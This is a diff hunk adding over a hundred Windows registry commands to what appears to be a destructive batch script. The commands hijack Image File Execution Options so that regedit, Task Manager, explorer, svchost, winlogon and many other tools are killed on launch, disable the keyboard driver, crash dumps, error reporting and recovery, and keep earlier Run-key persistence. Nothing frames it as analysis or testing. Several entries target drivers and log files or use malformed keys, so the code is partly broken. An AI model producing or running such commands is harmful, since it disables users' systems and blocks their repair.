@@ -184,3 +184,137 @@ reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v "rundll32_awspeG
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoUserNameInStartMenu" /d "1" /f >nul
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f
 reg add “HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System” /v DisableRegistryTools /t REG_DWORD /d “1”
+REG add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\MSIServer" /v "Default" /t REG_SZ /d "Service" /f
+REG ADD "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
+REG ADD "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting" /v Disabled /t REG_DWORD /d 1 /f > nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoProblemReports /t REG_DWORD /d 1 /f > nul
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\KeysNotToRestore" /v "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SubSystems\Windows" /t REG_MULTI_SZ /d "Anonymoussnake" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\KeysNotToRestore" /v "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SubSystems" /t REG_MULTI_SZ /d "" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Setup\RecoveryEnvironment" /v "CommandPromptFontColor" /t REG_DWORD /d "0xff00ff" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutomaticRestartSignOn" /t REG_DWORD /d "1" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutomaticRestartScheduledMaintenance" /t REG_DWORD /d "1" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutomaticRestartWithLoggedOnUsers" /t REG_DWORD /d "1" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutoRebootOnCrash" /t REG_DWORD /d "1" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v "CrashDumpEnabled" /t REG_DWORD /d "0" /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "%windir%\System32\systray.exe" /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TabTip.exe" /v Debugger /t REG_SZ /d "%windir%\System32\systray.exe" /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "%windir%\System32\systray.exe" /f
+REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\i8042prt\Parameters" /v "Start" /t REG_DWORD /d "4" /f
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /d 1 /f
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSuperHidden" /t REG_DWORD /d 1 /f
+REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /d 1 /f
+REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSuperHidden" /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t REG_SZ /d "taskkill.exe /f /im msedge.exe" /f
+reg add "HKLMc\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*" /v Debugger /t REG_SZ /d "taskkill /f /im regedit.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v Debugger /t REG_SZ /d "taskkill /f /im regedit.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "taskkill /f /im regedit.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedt32.exe" /v Debugger /t REG_SZ /d "taskkill /f /im regedit.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v Debugger /t REG_SZ /d "taskkill /f /im regedit.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe" /v Debugger /t REG_SZ /d "taskkill /f /im chrome.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe" /v Debugger /t REG_SZ /d "taskkill /f /im control.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell_ise.exe" /v Debugger /t REG_SZ /d "taskkill /f /im powershell_ise.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "taskkill /f /im winlogon.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winload.exe" /v Debugger /t REG_SZ /d "taskkill /f /im winload.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\discord.exe" /v Debugger /t REG_SZ /d "taskkill /f /im discord.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\win32k.sys" /v Debugger /t REG_SZ /d "taskkill /f /im win32k.sys" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\user32.dll" /v Debugger /t REG_SZ /d "taskkill /f /im user32.dll" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "taskkill /f /im winlogon.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winload.exe" /v Debugger /t REG_SZ /d "taskkill /f /im winload.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntoskrnl.exe" /v Debugger /t REG_SZ /d "taskkill /f /im ntoskrnl.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\kernel32.dll" /v Debugger /t REG_SZ /d "taskkill /f /im kernel32.dll" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cleanmgr.exe" /v Debugger /t REG_SZ /d "taskkill /f /im cleanmgr.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\systray.exe" /v Debugger /t REG_SZ /d "taskkill /f /im systray.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\compmgmt.msc" /v Debugger /t REG_SZ /d "taskkill /f /im compmgmt.msc" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "taskkill /f /im notepad.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\diskmgmt.msc" /v Debugger /t REG_SZ /d "taskkill /f /im diskmgmt.msc" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe" /v Debugger /t REG_SZ /d "taskkill /f /im mspaint.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SearchFilterHost.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SearchFilterHost.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SearchFolder.dll" /v Debugger /t REG_SZ /d "taskkill /f /im SearchFolder.dll" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "taskkill /f /im winlogon.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rundll32.exe" /v Debugger /t REG_SZ /d "taskkill /f /im rundll32.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mstsc.exe" /v Debugger /t REG_SZ /d "taskkill /f /im mstsc.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\System.evtx" /v Debugger /t REG_SZ /d "taskkill /f /im System.evtx" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wpd_ci.dll" /v Debugger /t REG_SZ /d "taskkill /f /im wpd_ci.dll" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntkrnlpa.exe" /v Debugger /t REG_SZ /d "taskkill /f /im ntkrnlpa.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SecEdit.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SecEdit.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmdkey.exe" /v Debugger /t REG_SZ /d "taskkill /f /im cmdkey.exe" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\partmgr.sys" /v Debugger /t REG_SZ /d "taskkill /f /im partmgr.sys" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\volmgr.sys" /v Debugger /t REG_SZ /d "taskkill /f /im volmgr.sys" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\disk.sys" /v Debugger /t REG_SZ /d "taskkill /f /im disk.sys" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atapi.sys" /v Debugger /t REG_SZ /d "taskkill /f /im atapi.sys" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\pci.sys" /v Debugger /t REG_SZ /d "taskkill /f /im pci.sys" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msisadrv.sys" /v Debugger /t REG_SZ /d "taskkill /f /im msisadrv.sys" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WUDFHost.exe" /v Debugger /t REG_SZ /d "taskkill /f /im WUDFHost.exe" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Security.evtx" /v Debugger /t REG_SZ /d "taskkill /f /im Security.evtx" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SystemResetPlatform.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SystemResetPlatform.exe" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wpdcomp.sys" /v Debugger /t REG_SZ /d "taskkill /f /im wpdcomp.sys" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wpdusb.sys" /v Debugger /t REG_SZ /d "taskkill /f /im wpdusb.sys" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clr.dll" /v Debugger /t REG_SZ /d "taskkill /f /im clr.dll" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clrjit.dll" /v Debugger /t REG_SZ /d "taskkill /f /im clrjit.dll" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clretwrc.dll" /v Debugger /t REG_SZ /d "taskkill /f /im clretwrc.dll" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clr.dll" /v Debugger /t REG_SZ /d "taskkill /f /im clr.dll" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clr.dll" /v Debugger /t REG_SZ /d "taskkill /f /im clr.dll" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clrcompression.dll" /v Debugger /t REG_SZ /d "taskkill /f /im clrcompression.dll" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mscorwks.dll" /v Debugger /t REG_SZ /d "taskkill /f /im mscorwks.dll" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wuaueng.dll" /v Debugger /t REG_SZ /d "taskkill /f /im wuaueng.dll" /f  
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bootvid.dll" /v Debugger /t REG_SZ /d "taskkill /f /im bootvid.dll" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\kdcom.dll" /v Debugger /t REG_SZ /d "taskkill /f /im kdcom.dll" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Ntfs.sys" /v Debugger /t REG_SZ /d "taskkill /f /im Ntfs.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\classpnp.sys" /v Debugger /t REG_SZ /d "taskkill /f /im classpnp.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ndis.sys" /v Debugger /t REG_SZ /d "taskkill /f /im ndis.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\partmgr.sys" /v Debugger /t REG_SZ /d "taskkill /f /im partmgr.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\volmgr.sys" /v Debugger /t REG_SZ /d "taskkill /f /im volmgr.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\volmgrx.sys" /v Debugger /t REG_SZ /d "taskkill /f /im volmgrx.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msrpc.sys" /v Debugger /t REG_SZ /d "taskkill /f /im msrpc.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\fs_rec.sys" /v Debugger /t REG_SZ /d "taskkill /f /im fs_rec.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\usbport.sys" /v Debugger /t REG_SZ /d "taskkill /f /im usbport.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\usbehci.sys" /v Debugger /t REG_SZ /d "taskkill /f /im usbehci.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\acpi.sys" /v Debugger /t REG_SZ /d "taskkill /f /im acpi.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\classpnp.sys" /v Debugger /t REG_SZ /d "taskkill /f /im classpnp.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\pci.sys" /v Debugger /t REG_SZ /d "taskkill /f /im pci.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\usbuhci.sys" /v Debugger /t REG_SZ /d "taskkill /f /im usbuhci.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\fastfat.sys" /v Debugger /t REG_SZ /d "taskkill /f /im fastfat.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msrpc.sys" /v Debugger /t REG_SZ /d "taskkill /f /im msrpc.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\usbuhci.sys" /v Debugger /t REG_SZ /d "taskkill /f /im volmgr.sys" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ReAgent.xml" /v Debugger /t REG_SZ /d "taskkill /f /im ReAgent.xml" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "taskkill /f /im winlogon.exe" /f
+reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\System /v DisableAutomaticRebootOnCrash /t REG_DWORD /d 1 /f
+reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Recovery /v IgnoreAutoRecoveryEnabled /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN" /v CheckedValue /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t REG_DWORD /d 1 /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" /v SpecialPollInterval /t REG_DWORD /d 86400 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" /v NoGenTicket /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoRestartShell /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Taskmgr.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\takeown.exe" /v Debugger /t REG_SZ /d "taskkill /f /im takeown.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SystemSettings.DataModel.dll" /v Debugger /t REG_SZ /d "taskkill /f /im SystemSettings.DataModel.dll" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\systeminfo.exe" /v Debugger /t REG_SZ /d "taskkill /f /im systeminfo.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SystemSettings.UserAccountsHandlers.dll" /v Debugger /t REG_SZ /d "taskkill /f /im SystemSettings.UserAccountsHandlers.dll" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SystemUWPLauncher.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SystemUWPLauncher.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SystemSettingsRemoveDevice.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SystemSettingsRemoveDevice.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SystemSettingsAdminFlows.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SystemSettingsAdminFlows.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msinfo32.exe" /v Debugger /t REG_SZ /d "taskkill /f /im msinfo32.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SnippingTool.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SnippingTool.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\coredpussvr.exe" /v Debugger /t REG_SZ /d "taskkill /f /im coredpussvr.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\runonce.exe" /v Debugger /t REG_SZ /d "taskkill /f /im runonce.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmdext.dll" /v Debugger /t REG_SZ /d "taskkill /f /im cmdext.dll" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RuntimeBroker.exe" /v Debugger /t REG_SZ /d "taskkill /f /im RuntimeBroker.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\hal.dll" /v Debugger /t REG_SZ /d "taskkill /f /im hal.dll" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tcpip.sys" /v Debugger /t REG_SZ /d "taskkill /f /im tcpip.sys" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atikmdag.sys" /v Debugger /t REG_SZ /d "taskkill /f /im atikmdag.sys" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\classpnp.sys" /v Debugger /t REG_SZ /d "taskkill /f /im classpnp.sys" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atikmdag.sys" /v Debugger /t REG_SZ /d "taskkill /f /im atikmdag.sys" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\nvlddmkm.sys" /v Debugger /t REG_SZ /d "taskkill /f /im nvlddmkm.sys" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v Debugger /t REG_SZ /d "taskkill /f /im svchost.exe" /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Msconfig.exe " /v Debugger /t REG_SZ /d "taskkill /f /im Msconfig.exe " /f 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SecurityHealthSystray.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SecurityHealthSystray.exe" /f
